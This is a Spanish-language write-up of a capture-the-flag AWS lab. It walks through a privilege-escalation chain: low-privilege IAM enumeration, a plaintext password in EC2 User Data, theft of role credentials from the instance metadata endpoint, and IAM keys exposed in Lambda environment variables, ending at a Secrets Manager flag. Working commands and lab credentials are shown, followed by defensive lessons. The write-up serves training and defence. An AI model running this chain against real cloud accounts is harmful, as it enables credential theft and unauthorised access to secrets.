# Writeup: Data Secrets (Hack Smarter — AWS Pentesting)

Data Secrets es una máquina **Media** diseñada para simular un entorno AWS vulnerable. El objetivo es comenzar con unas credenciales IAM de bajo privilegio y, a través de una serie de enumeraciones y escaladas, obtener acceso al **AWS Secrets Manager** para recuperar la flag final. El recorrido incluye la exploración de servicios como EC2, IAM, Lambda y Secrets Manager, el abuso del *User Data* de una instancia EC2 para obtener acceso SSH, la extracción de credenciales temporales desde el endpoint de metadatos, y finalmente la explotación de credenciales expuestas en variables de entorno de una función Lambda para acceder al secreto.

---

## 🎯 Objetivo / Scope

El equipo *Hack Smarter Red Team* ha comenzado a ofrecer servicios de pentesting en AWS. La principal preocupación del cliente es si un atacante puede obtener acceso a su **Secrets Manager**. Tu tarea es comenzar con las credenciales proporcionadas y realizar movimiento lateral y escalada de privilegios hasta obtener acceso al Secrets Manager, donde se encuentra la bandera final.

---

## ⚙️ Configuración inicial de credenciales

Recibimos unas credenciales de AWS para un usuario IAM. Las configuramos en la CLI de AWS:

```bash
aws configure --profile data-secrets
```

**Datos proporcionados:**

- `AWS Access Key ID`: `AKIA*******************`
- `AWS Secret Access Key`: `VJfId3Q*******************`
- `Default region name`: `us-east-1`
- `Default output format`: `json`

Verificamos nuestra identidad:

```bash
aws sts get-caller-identity --profile data-secrets
```

```json
{
    "UserId": "AIDAQ*******************",
    "Account": "067103977971",
    "Arn": "arn:aws:iam::067103977971:user/cg-start-user-lab"
}
```

Somos el usuario IAM `cg-start-user-lab` en la cuenta `067103977971`. Exportamos el perfil para no tener que especificarlo en cada comando:

```bash
export AWS_PROFILE=data-secrets
```

---

## 🔍 Fase 1: Enumeración inicial con `cg-start-user-lab`

Con el perfil activo, intentamos enumerar varios servicios de AWS para comprender nuestros permisos. La mayoría de los comandos devolverán errores de `AccessDenied`, lo que nos indica que no tenemos permisos para esas acciones. Esto es normal y forma parte del proceso de descubrimiento.

### 1.1 IAM - Usuarios y políticas

Intentamos obtener información sobre el propio usuario:

```bash
aws iam get-user
```

```bash
aws: [ERROR]: An error occurred (AccessDenied) when calling the GetUser operation: User: arn:aws:iam::067103977971:user/cg-start-user-lab is not authorized to perform: iam:GetUser on resource: user cg-start-user-lab because no identity-based policy allows the iam:GetUser action
```

**Explicación:** El servicio **IAM** (Identity and Access Management) permite gestionar usuarios, roles y políticas. La acción `GetUser` requiere permisos específicos. Nuestro usuario no tiene una política que lo permita, por lo que la llamada es denegada.

Probamos a listar las claves de acceso del usuario:

```bash
aws iam list-access-keys
```

```bash
aws: [ERROR]: An error occurred (AccessDenied) when calling the ListAccessKeys operation: User: arn:aws:iam::067103977971:user/cg-start-user-lab is not authorized to perform: iam:ListAccessKeys on resource: user nullcg-start-user-lab because no identity-based policy allows the iam:ListAccessKeys action
```

**Explicación:** `ListAccessKeys` permite listar las claves de acceso de un usuario. No tenemos permiso.

Intentamos listar todos los usuarios del entorno:

```bash
aws iam list-users
```

```bash
aws: [ERROR]: An error occurred (AccessDenied) when calling the ListUsers operation: User: arn:aws:iam::067103977971:user/cg-start-user-lab is not authorized to perform: iam:ListUsers on resource: arn:aws:iam::067103977971:user/ because no identity-based policy allows the iam:ListUsers action
```

**Explicación:** `ListUsers` permite enumerar todos los usuarios IAM de la cuenta. No tenemos permiso.

Listamos roles:

```bash
aws iam list-roles
```

```bash
aws: [ERROR]: An error occurred (AccessDenied) when calling the ListRoles operation: User: arn:aws:iam::067103977971:user/cg-start-user-lab is not authorized to perform: iam:ListRoles on resource: arn:aws:iam::067103977971:role/ because no identity-based policy allows the iam:ListRoles action
```

**Explicación:** `ListRoles` permite ver todos los roles IAM. No tenemos permiso.

Listamos políticas:

```bash
aws iam list-policies
```

```bash
aws: [ERROR]: An error occurred (AccessDenied) when calling the ListPolicies operation: User: arn:aws:iam::067103977971:user/cg-start-user-lab is not authorized to perform: iam:ListPolicies on resource: policy path / because no identity-based policy allows the iam:ListPolicies action
```

**Explicación:** `ListPolicies` permite ver las políticas administradas. No tenemos permiso.

Listamos políticas adjuntas al usuario:

```bash
aws iam list-user-policies --user-name cg-start-user-lab
aws iam list-attached-user-policies --user-name cg-start-user-lab
```

Ambos fallan con `AccessDenied`. Lo mismo ocurre al listar grupos y grupos del usuario.

### 1.2 S3 - Almacenamiento

Intentamos listar los buckets de S3:

```bash
aws s3 ls
```

```bash
aws: [ERROR]: An error occurred (AccessDenied) when calling the ListBuckets operation: User: arn:aws:iam::067103977971:user/cg-start-user-lab is not authorized to perform: s3:ListAllMyBuckets because no identity-based policy allows the s3:ListAllMyBuckets action
```

**Explicación:** **S3** es el servicio de almacenamiento de objetos de AWS. La acción `ListAllMyBuckets` permite listar todos los buckets de la cuenta. No tenemos permiso.

### 1.3 RDS - Bases de datos

Intentamos describir instancias de RDS:

```bash
aws rds describe-db-instances
```

```bash
aws: [ERROR]: An error occurred (AccessDenied) when calling the DescribeDBInstances operation: User: arn:aws:iam::067103977971:user/cg-start-user-lab is not authorized to perform: rds:DescribeDBInstances on resource: arn:aws:rds:us-east-1:067103977971:db:* because no identity-based policy allows the rds:DescribeDBInstances action
```

**Explicación:** **RDS** es el servicio de bases de datos relacionales. `DescribeDBInstances` permite listar las instancias de bases de datos. No tenemos permiso.

### 1.4 Lambda - Funciones serverless

Intentamos listar funciones Lambda:

```bash
aws lambda list-functions
```

```bash
aws: [ERROR]: An error occurred (AccessDeniedException) when calling the ListFunctions operation: User: arn:aws:iam::067103977971:user/cg-start-user-lab is not authorized to perform: lambda:ListFunctions on resource: * because no identity-based policy allows the lambda:ListFunctions action
```

**Explicación:** **Lambda** es el servicio de computación serverless. `ListFunctions` permite enumerar las funciones Lambda. No tenemos permiso.

### 1.5 API Gateway - APIs

Intentamos listar las APIs REST:

```bash
aws apigateway get-rest-apis
```

```bash
aws: [ERROR]: An error occurred (AccessDeniedException) when calling the GetRestApis operation: User: arn:aws:iam::067103977971:user/cg-start-user-lab is not authorized to perform: apigateway:GET on resource: arn:aws:apigateway:us-east-1::/restapis because no identity-based policy allows the apigateway:GET action
```

**Explicación:** **API Gateway** permite crear y gestionar APIs. `GetRestApis` lista las APIs. No tenemos permiso.

### 1.6 EC2 - Instancias (Éxito)

Finalmente, probamos con EC2:

```bash
aws ec2 describe-instances
```

Este comando **sí funciona** y devuelve información detallada sobre las instancias EC2. Para visualizarlo mejor, usamos `jq`:

```bash
aws ec2 describe-instances | jq
```

**Explicación:** **EC2** es el servicio de computación en la nube de AWS. `DescribeInstances` permite obtener información sobre las instancias EC2, incluyendo IDs, direcciones IP, grupos de seguridad, perfiles de instancia, etc. Aparentemente, nuestro usuario tiene permisos para esta acción.

De la salida, extraemos información crítica:

```json
"InstanceId": "i-05ee1101ea8397dc8",
"PublicIpAddress": "13.218.194.35",
"GroupId": "sg-0a747e1c7a7265586",
"IamInstanceProfile": {
    "Arn": "arn:aws:iam::067103977971:instance-profile/cg-ec2-instance-profile-lab",
    "Id": "AIPAQ7H5VOHZ3XGRLJKTF"
}
```

**Claves:**
- **Instance ID**: `i-05ee1101ea8397dc8`
- **Public IP**: `13.218.194.35`
- **Security Group ID**: `sg-0a747e1c7a7265586`
- **Instance Profile Name**: `cg-ec2-instance-profile-lab`

---

## 🔎 Fase 2: Reconocimiento de la instancia EC2

### 2.1 Escaneo de puertos a la IP pública

La instancia tiene una IP pública. Realizamos un escaneo de puertos con Nmap:

```bash
nmap -Pn 13.218.194.35
```

```bash
Starting Nmap 7.99 ( https://nmap.org ) at 2026-07-17 18:23 -0400
Nmap scan report for ec2-13-218-194-35.compute-1.amazonaws.com (13.218.194.35)
Host is up (0.11s latency).
Not shown: 999 filtered tcp ports (no-response)
PORT   STATE SERVICE
22/tcp open  ssh
```

Solo el puerto 22 (SSH) está abierto. Esto sugiere que podríamos intentar acceder por SSH si encontramos credenciales.

### 2.2 Intentos de enumeración de seguridad

Intentamos describir el grupo de seguridad para ver qué reglas tiene:

```bash
aws ec2 describe-security-groups --group-ids sg-0a747e1c7a7265586 --region us-east-1
```

```bash
aws: [ERROR]: An error occurred (UnauthorizedOperation) when calling the DescribeSecurityGroups operation: You are not authorized to perform this operation. User: arn:aws:iam::067103977971:user/cg-start-user-lab is not authorized to perform: ec2:DescribeSecurityGroups because no identity-based policy allows the ec2:DescribeSecurityGroups action
```

**Explicación:** No tenemos permiso para describir grupos de seguridad.

Intentamos obtener el perfil de instancia:

```bash
aws iam get-instance-profile --instance-profile-name cg-ec2-instance-profile-lab --region us-east-1
```

```bash
aws: [ERROR]: An error occurred (AccessDenied) when calling the GetInstanceProfile operation: User: arn:aws:iam::067103977971:user/cg-start-user-lab is not authorized to perform: iam:GetInstanceProfile on resource: instance profile cg-ec2-instance-profile-lab because no identity-based policy allows the iam:GetInstanceProfile action
```

**Explicación:** No tenemos permiso para obtener detalles del perfil de instancia.

### 2.3 Obtención del User Data de la instancia

Las instancias EC2 pueden tener asociado un **User Data**, un script que se ejecuta al arrancar la máquina. Este script puede contener información sensible. Intentamos obtenerlo:

```bash
aws ec2 describe-instance-attribute --instance-id i-05ee1101ea8397dc8 --attribute userData --region us-east-1
```

**Explicación:** `describe-instance-attribute` con `--attribute userData` permite recuperar el User Data de una instancia. Afortunadamente, nuestro usuario tiene permiso para esta acción.

**Salida:**

```json
{
    "InstanceId": "i-05ee1101ea8397dc8",
    "UserData": {
        "Value": "IyEvYmluL2Jhc2gKZWNobyAiZWMyLXVzZXI6Q2xvdWRHb2F0SW5zdGFuY2VQYXNzd29yZCEiIHwgY2hwYXNzd2QKc2VkIC1pICdzL1Bhc3N3b3JkQXV0aGVudGljYXRpb24gbm8vUGFzc3dvcmRBdXRoZW50aWNhdGlvbiB5ZXMvZycgL2V0Yy9zc2gvc3NoZF9jb25maWcKc2VydmljZSBzc2hkIHJlc3RhcnQK"
    }
}
```

El User Data está codificado en Base64. Lo decodificamos:

```bash
echo 'IyEvYmluL2Jhc2gKZWNobyAiZWMyLXVzZXI6Q2xvdWRHb2F0SW5zdGFuY2VQYXNzd29yZCEiIHwgY2hwYXNzd2QKc2VkIC1pICdzL1Bhc3N3b3JkQXV0aGVudGljYXRpb24gbm8vUGFzc3dvcmRBdXRoZW50aWNhdGlvbiB5ZXMvZycgL2V0Yy9zc2gvc3NoZF9jb25maWcKc2VydmljZSBzc2hkIHJlc3RhcnQK' | base64 -d
```

**Contenido decodificado:**

```bash
#!/bin/bash
echo "ec2-user:CloudGoatInstancePassword!" | chpasswd
sed -i 's/PasswordAuthentication no/PasswordAuthentication yes/g' /etc/ssh/sshd_config
service sshd restart
```

**Explicación:** El script establece la contraseña del usuario `ec2-user` a `CloudGoatInstancePassword!`, habilita la autenticación por contraseña en SSH y reinicia el servicio SSH. Esto es una práctica muy insegura, ya que expone credenciales en texto plano dentro del User Data.

---

## 🚪 Fase 3: Acceso SSH a la instancia

Con las credenciales obtenidas, nos conectamos por SSH:

```bash
ssh ec2-user@13.218.194.35
```

```bash
The authenticity of host '13.218.194.35 (13.218.194.35)' can't be established.
ED25519 key fingerprint is SHA256:CNf0OrpMmu5WQx3WxzjpUH7ezQbjEI7XcOqgYPj677I.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '13.218.194.35' (ED25519) to the list of known hosts.
ec2-user@13.218.194.35's password: CloudGoatInstancePassword!
```

Una vez dentro, verificamos nuestro usuario:

```bash
[ec2-user@ip-10-0-1-50 ~]$ whoami
ec2-user
```

---

## 🔑 Fase 4: Enumeración dentro de la instancia

### 4.1 Identidad AWS desde la instancia

Desde dentro de la instancia, podemos consultar la identidad AWS usando el CLI (que ya viene instalado en la AMI de Amazon Linux):

```bash
[ec2-user@ip-10-0-1-50 ~]$ aws sts get-caller-identity
```

```json
{
    "Account": "067103977971",
    "UserId": "AROAQ7H5VOHZ6TAGCVGST:i-05ee1101ea8397dc8",
    "Arn": "arn:aws:sts::067103977971:assumed-role/cg-ec2-role-lab/i-05ee1101ea8397dc8"
}
```

**Explicación:** La instancia EC2 tiene asignado un **rol IAM** (`cg-ec2-role-lab`). Esto significa que cualquier llamada AWS realizada desde la instancia utilizará las credenciales de ese rol, no las del usuario `ec2-user`.

### 4.2 Acceso al endpoint de metadatos

El endpoint de metadatos (`http://169.254.169.254/latest/meta-data/`) proporciona información sobre la instancia, incluyendo las credenciales temporales del rol IAM. Intentamos acceder:

```bash
[ec2-user@ip-10-0-1-50 ~]$ curl http://169.254.169.254/latest/meta-data/
```

```bash
ami-id
ami-launch-index
ami-manifest-path
block-device-mapping/
events/
hibernation/
hostname
iam/
identity-credentials/
instance-action
instance-id
instance-life-cycle
instance-type
local-hostname
local-ipv4
mac
metrics/
network/
placement/
profile
public-hostname
public-ipv4
reservation-id
security-groups
services/
```

El directorio `iam/security-credentials/` contiene las credenciales del rol. Obtenemos las credenciales del rol `cg-ec2-role-lab`:

```bash
[ec2-user@ip-10-0-1-50 ~]$ curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/cg-ec2-role-lab
```

```json
{
  "Code" : "Success",
  "LastUpdated" : "2026-07-17T22:43:17Z",
  "Type" : "AWS-HMAC",
  "AccessKeyId" : "ASIAQ*******************",
  "SecretAccessKey" : "xscEtlbgUQZ0wbugHHWyJxvboI4ML0gAePXxa0Cl",
  "Token" : "IQoJb3JpZ2luX2VjEJ///////////wEaCXVzLWVhc3QtMSJIMEYCIQCvXoX9mDhTz1ivj9CeFMIaaLIrwCEj9OfPE9fw1tpkmgIhAMlwYLNIHl02XerYaKbqU5akthehP2BFXYDsQJ/D9+6rKrgFCGgQABoMMDY3MTAzOTc3OTcxIgwDCBffWStsihTKNmoqlQUkcjRktthYEDjcDfMwe74EKKcYsKnQ5ZKwEeeG0obRNoMKwap9GhAyj6OnGmaeFP9o9CmSl+P8EzGDfP9Oejz3myHO0lUkEIq5jLAWkx81KhzqZHef1Khxaa9J4LiueLqq9sCGDIKsXJNAwMea/Nj8/hrdOYhsUPr9H7O0rP9jbPHlD57jAOfKHi+MbqcPAAbaLsR5Jc3sNT1QD4pXQEVOT/wj8KeUA1NiYjQW8QHjTtRZCps+qo5TJgsHJ2iJB7SYTWESUCMpimS4YM1KpPqQn4tBeCY3fWoE+nxViByglIMVXsWwoyN3Kr0sJuRtWCYjdjKPbMSc4ffiEbbSSaH5QdwkcKj1aKMeeeHG9CWmby7T5ktYC4J/jZM+xV70evooQfMU9kh5eCXiYHMgJKlR7rcdwWyNf5cXWYp9DG6LxrWDY8gHJzEUMQKR1EQqZ2+yTC9VxS2xFuCegtRZw7lzTdA80V4KzcVtEKvXnUK0eWVrsCG5weXT9Ijv8mY9D1klNcjXoheNLHN42Gczaa6js6U5mlWZKRkQe3cj07lGMj1ziOTbouAe4Z6vHadLQ87vQvhiX8gVQwxavBMLrGeyRJeaPgXILQcj9EHnaZGbqDQ7w7llLS9MsyiTmn0+bgdChc/5CAXp3EOJiS4BY7JoHO/lgIXwUXZshuHE4gX3L3Yaf96qqIJmjLPnQ8vWiqIcLPzH8Mu9AwwylVMs4125r1RlfYqMeGAFs6ntd8+isKHK7qIELVOvmVcyT0YmovxxNgIvQ8qaf7gTah2cFSw3lrfRPDcieKQ89JmXIEoEmipf8nHsQijfjZxaqegkCFLZu5IQG3TMmKo/b4j1EbbJJ0EvmJ6nvawGb5856xpuX6uK/xr8MK3g6tIGOrAB1dAnJKkKvvukjmA1EDACaECd7iem+edJYoirJdd0SlT9MWkvwbWDP7Y26VoXCxFdpIyUGuSiUc6PvF25MDwFOIGLpS+Va9Roxl3YAAlzDji1Ad0Te6GvNMEuHnlPXee0qaoHjy9EsqTdv0khiLdXQ2PGsM7VJtMyyULGT5lLcr9cqCXNG4pp9F0oitvYBeV5KMF72SIyKiZZXITrkSzEBrmYf/p366L5h7PWabCwt5s=",
  "Expiration" : "2026-07-18T05:03:20Z"
}
```

**Explicación:** El endpoint de metadatos proporciona credenciales temporales (Access Key, Secret Key y Token de sesión) que permiten asumir el rol `cg-ec2-role-lab`. Estas credenciales son válidas hasta la fecha de expiración.

---

## 🔄 Fase 5: Configuración de nuevo perfil con credenciales del rol

De vuelta en nuestra máquina Kali, configuramos un nuevo perfil de AWS con las credenciales temporales obtenidas:

```bash
aws configure --profile ec2role
```

```bash
AWS Access Key ID [None]: ASIAQ7H5*******************
AWS Secret Access Key [None]: xscEtlbgUQZ0wbug*******************
AWS Session Token [None]: IQoJb3JpZ2luX2VjEJ///////////wEaCXVzLWVhc3QtMSJIMEYCIQCvXoX9mDhTz1ivj9C*******************Hl02XerYaKbqU5akthehP2BFXYDsQJ/D9+6rKrgFCGgQABoMMDY3MTAzOTc3OTcxIgwDCBffWStsihTKNmoqlQUkcjRktthYEDjcDfMwe74EKKcYsKnQ5ZKwEeeG0obRNoMKwap9GhAyj6OnGmaeFP9o9CmSl+P8EzGDfP9Oejz3myHO0lUkEIq5jLAWkx81KhzqZHef1Khxaa9J4LiueLqq9sCGDIKsXJNAwMea/Nj8/hrdOYhsUPr9H7O0rP9jbPHlD57jAOfKHi+MbqcPAAbaLsR5Jc3sNT1QD4pXQEVOT/wj8KeUA1NiYjQW8QHjTtRZCps+qo5TJgsHJ2iJB7SYTWESUCMpimS4YM1KpPqQn4tBeCY3fWoE+nxViByglIMVXsWwoyN3Kr0sJuRtWCYjdjKPbMSc4ffiEbbSSaH5QdwkcKj1aKMeeeHG9CWmby7T5ktYC4J/jZM+xV70evooQfMU9kh5eCXiYHMgJKlR7rcdwWyNf5cXWYp9DG6LxrWDY8gHJzEUMQKR1EQqZ2+yTC9VxS2xFuCegtRZw7lzTdA80V4KzcVtEKvXnUK0eWVrsCG5weXT9Ijv8mY9D1klNcjXoheNLHN42Gczaa6js6U5mlWZKRkQe3cj07lGMj1ziOTbouAe4Z6vHadLQ87vQvhiX8gVQwxavBMLrGeyRJeaPgXILQcj9EHnaZGbqDQ7w7llLS9MsyiTmn0+bgdChc/5CAXp3EOJiS4BY7JoHO/lgIXwUXZshuHE4gX3L3Yaf96qqIJmjLPnQ8vWiqIcLPzH8Mu9AwwylVMs4125r1RlfYqMeGAFs6ntd8+isKHK7qIELVOvmVcyT0YmovxxNgIvQ8qaf7gTah2cFSw3lrfRPDcieKQ89JmXIEoEmipf8nHsQijfjZxaqegkCFLZu5IQG3TMmKo/b4j1EbbJJ0EvmJ6nvawGb5856xpuX6uK/xr8MK3g6tIGOrAB1dAnJKkKvvukjmA1EDACaECd7iem+edJYoirJdd0SlT9MWkvwbWDP7Y26VoXCxFdpIyUGuSiUc6PvF25MDwFOIGLpS+Va9Roxl3YAAlzDji1Ad0Te6GvNMEuHnlPXee0qaoHjy9EsqTdv0khiLdXQ2PGsM7VJtMyyULGT5lLcr9cqCXNG4pp9F0oitvYBeV5KMF72SIyKiZZXITrkSzEBrmYf/p366L5h7PWabCwt5s=
Default region name [None]: us-east-1
Default output format [None]: json
```

Verificamos la identidad:

```bash
aws sts get-caller-identity --profile ec2role
```

```json
{
    "UserId": "AROAQ7H5VOHZ6TAGCVGST:i-05ee1101ea8397dc8",
    "Account": "067103977971",
    "Arn": "arn:aws:sts::067103977971:assumed-role/cg-ec2-role-lab/i-05ee1101ea8397dc8"
}
```

Ahora estamos asumiendo el rol `cg-ec2-role-lab`.

---

## 🧩 Fase 6: Enumeración con el rol `cg-ec2-role-lab`

Con el nuevo perfil, empezamos a enumerar servicios. El objetivo es encontrar credenciales o configuraciones que nos permitan acceder al Secrets Manager.

### 6.1 Listar funciones Lambda

```bash
aws lambda list-functions --profile ec2role | jq
```

**Explicación:** **Lambda** permite ejecutar código sin aprovisionar servidores. `ListFunctions` enumera las funciones existentes. Esta vez sí tenemos permiso.

**Salida:**

```json
{
  "Functions": [
    {
      "FunctionName": "cg-lambda-function-lab",
      "FunctionArn": "arn:aws:lambda:us-east-1:067103977971:function:cg-lambda-function-lab",
      "Runtime": "python3.9",
      "Role": "arn:aws:iam::067103977971:role/cg-lambda-exec-role-lab",
      "Handler": "lambda_function.lambda_handler",
      "CodeSize": 221,
      "Description": "",
      "Timeout": 3,
      "MemorySize": 128,
      "LastModified": "2026-07-17T21:53:09.729+0000",
      "CodeSha256": "J7+tACeZu8267g5XEXe/iTlv1Ip9wdtOr/IzHK/W9fc=",
      "Version": "$LATEST",
      "Environment": {
        "Variables": {
          "DB_USER_ACCESS_KEY": "AKIAQ7*******************",
          "DB_USER_SECRET_KEY": "8rlIZwuEkZcFbHB00ix*******************"
        }
      },
      ...
    }
  ]
}
```

**Hallazgo crítico:** La función Lambda `cg-lambda-function-lab` tiene definidas variables de entorno que contienen credenciales de acceso:

- `DB_USER_ACCESS_KEY`: `AKIAQ7H5VO*******************`
- `DB_USER_SECRET_KEY`: `8rlIZwuEkZcFbHB00ix6******************`

Estas credenciales parecen pertenecer a un usuario IAM.

---

## 🔐 Fase 7: Configuración de perfil con credenciales de Lambda

Creamos un nuevo perfil con las credenciales extraídas:

```bash
aws configure --profile db-user
```

```bash
AWS Access Key ID [None]: AKIAQ7H5VO******************
AWS Secret Access Key [None]: 8rlIZwuEkZcFbH******************
Default region name [None]: us-east-1
Default output format [None]: json
```

Verificamos la identidad:

```bash
aws sts get-caller-identity --profile db-user
```

```json
{
    "UserId": "AIDAQ7H5VOHZZ3WZKJ2BZ",
    "Account": "067103977971",
    "Arn": "arn:aws:iam::067103977971:user/cg-db-user-lab"
}
```

Somos el usuario IAM `cg-db-user-lab`.

---

## 🏁 Fase 8: Acceso al Secrets Manager

Ahora podemos listar los secretos almacenados en **AWS Secrets Manager**:

```bash
aws secretsmanager list-secrets --region us-east-1 --profile db-user --query 'SecretList[].{Name:Name,ARN:ARN,Description:Description,Tags:Tags}'
```

**Explicación:** **Secrets Manager** es un servicio para almacenar, rotar y gestionar secretos como credenciales de bases de datos, claves de API, etc. `ListSecrets` enumera los secretos disponibles. Nuestro usuario tiene permiso para esta acción.

**Salida:**

```json
[
    {
        "Name": "cg-final-flag-lab",
        "ARN": "arn:aws:secretsmanager:us-east-1:067103977971:secret:cg-final-flag-lab-tP4pZo",
        "Description": "The final flag for the CloudGoat scenario",
        "Tags": [
            {
                "Key": "Name",
                "Value": "cg-final-flag-lab"
            },
            {
                "Key": "Scenario",
                "Value": "scenario_template"
            },
            {
                "Key": "Stack",
                "Value": "CloudGoat"
            }
        ]
    }
]
```

El secreto se llama `cg-final-flag-lab`. Obtenemos su valor:

```bash
aws secretsmanager get-secret-value --secret-id cg-final-flag-lab --profile db-user
```

**Explicación:** `GetSecretValue` recupera el contenido de un secreto. Esta acción requiere permisos específicos, que nuestro usuario tiene.

**Salida:**

```json
{
    "ARN": "arn:aws:secretsmanager:us-east-1:067103977971:secret:cg-final-flag-lab-tP4pZo",
    "Name": "cg-final-flag-lab",
    "VersionId": "terraform-UowKtWdwWeVwzVzdAt8I7JR3Sc",
    "SecretString": "{\"flag\":\"d4t4_s3cr3ts_4r3_fun\"}",
    "VersionStages": [
        "AWSCURRENT"
    ],
    "CreatedDate": "2026-07-17T17:53:01.214000-04:00"
}
```

La flag es: **`d4t4_s3cr3ts_4r3_fun`**. Hemos cumplido el objetivo.

---

## 📌 Conclusión

Data Secrets es una máquina **Media** que simula un entorno AWS con múltiples capas de privilegios. El recorrido incluye:

1. **Enumeración inicial** con un usuario IAM de bajo privilegio (`cg-start-user-lab`), que solo tiene permiso para describir instancias EC2.
2. **Extracción del User Data** de la instancia EC2, que contenía credenciales SSH en texto plano.
3. **Acceso SSH a la instancia** y obtención de credenciales temporales del rol IAM desde el endpoint de metadatos.
4. **Configuración de un nuevo perfil** con el rol `cg-ec2-role-lab`, que permitió listar funciones Lambda.
5. **Extracción de credenciales** desde las variables de entorno de una función Lambda.
6. **Configuración de un tercer perfil** con el usuario `cg-db-user-lab`, que tenía permisos sobre Secrets Manager.
7. **Listado y recuperación del secreto** que contenía la flag final.

---

## 📚 Lecciones aprendidas

1. **El principio de mínimo privilegio no se aplica correctamente**  
   El usuario `cg-start-user-lab` tenía permisos para describir instancias EC2 y obtener el User Data, lo que permitió extraer credenciales SSH. Además, el rol `cg-ec2-role-lab` tenía permisos para listar funciones Lambda, lo que expuso credenciales adicionales. Cada servicio debe tener permisos estrictamente necesarios.

2. **Nunca almacenar credenciales en el User Data de EC2**  
   El User Data de la instancia contenía una contraseña en texto plano. Esta información es accesible por cualquier usuario con permisos `ec2:DescribeInstanceAttribute`. Las credenciales deben gestionarse mediante servicios como Secrets Manager o Parameter Store.

3. **Las variables de entorno de Lambda pueden exponer secretos**  
   La función Lambda tenía credenciales IAM en variables de entorno. Cualquier usuario con permisos `lambda:ListFunctions` y `lambda:GetFunction` puede ver estas variables. Los secretos deben almacenarse en Secrets Manager y referenciarse desde Lambda.

4. **El endpoint de metadatos de EC2 es un vector de escalada de privilegios**  
   Una vez dentro de la instancia, el atacante puede obtener las credenciales del rol IAM asignado. Si el rol tiene permisos amplios, esto permite un movimiento lateral significativo. Es crucial limitar los permisos de los roles de EC2 y habilitar la versión 2 del endpoint de metadatos (IMDSv2) con restricciones de `HttpPutResponseHopLimit`.

5. **La enumeración sistemática es clave en pentesting en la nube**  
   A pesar de los múltiples fallos de `AccessDenied`, la persistencia para probar diferentes servicios y acciones permitió descubrir los pocos permisos que sí teníamos, lo que llevó a la escalada de privilegios.

6. **La separación de cuentas y roles no es suficiente si los permisos son laxos**  
   Aunque los servicios estaban segmentados (usuario inicial, rol EC2, usuario Lambda, usuario DB), la cadena de permisos permitió escalar desde un usuario sin privilegios hasta el acceso al Secrets Manager.

7. **AWS CLI y herramientas como `jq` son esenciales para manejar salidas JSON**  
   El uso de `jq` facilitó la extracción de información relevante de las respuestas JSON, especialmente en comandos con grandes volúmenes de datos.

